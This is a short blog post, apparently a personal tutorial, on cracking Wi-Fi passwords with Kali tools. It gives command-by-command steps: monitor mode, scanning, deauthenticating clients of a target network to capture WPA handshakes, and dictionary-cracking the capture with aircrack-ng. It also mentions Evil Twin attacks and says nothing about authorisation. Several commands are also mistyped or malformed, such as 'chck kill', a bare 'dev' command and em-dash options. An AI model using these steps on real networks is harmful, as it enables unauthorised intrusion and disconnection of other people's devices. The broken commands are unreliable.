---
layout: post
title:  "Cracking Wi-Fi Network"
summary: 'Tips to use Airgeddon and other Kali tools'

author: gabro
date: '2024-08-12 1:35:23 +0530'
category: ['cracking']
tags: cracking
thumbnail: /assets/img/posts/kali/kali.png
keywords: cracking, kali linux, airgeddon, wifi
permalink: /blog/kali-tips/
---

## Set Philippine channel
```
sudo iw reg set PH
```
this is needed so we have access to more channels 

## See interfaces to use
```
iw dev
iwconfig
```

## Set interface in monitor mode
```
sudo iwconfig wlan0 mode monitor 
```

## Test the interface
```
sudo aireplay-ng --test wlan0
```

## Soft reset of the interface
```
sudo airmon-ng chck kill
sudo ip link set wlan0 down
sudo dev wlan0 set type monitor
```

### Scan Wi-Fi networks
```
sudo airodump-ng wlan0
```
or
```
sudo airodump-ng —band abg wlan0
```

# Airgeddon 👨🏻‍💻
A powerful tool for Kali, useful for obtaining handshakes and performing Evil Twin attacks. It’s worth noting that for capturing handshakes, it can be helpful to perform the following steps in another terminal while listening to connected devices, that is, during the handshake acquisition phase.

* Identification of devices connected to a network
```
sudo airodump-ng —bssid <target_mac> —channel <id> wlan0
```

* Deauthentication of the found client
```
sudo aireplay-ng —deauth 10 -a <Target MacAddress> -c <Target Device MAC> wlan0
```
This procedure can be done for each client connected to the network to increase the chances of capturing a handshake.

## Aircrack-ng 👨🏻‍💻
Another powerful tool included within Airgeddon but that can also be used separately is Aircrack-ng. For example, it can be used to crack the .cap file with a dictionary. However, it is not very efficient and is somewhat less customizable, so Hashcat is often a better choice.
```
sudo aircrack-ng dict.txt handshake.cap
```

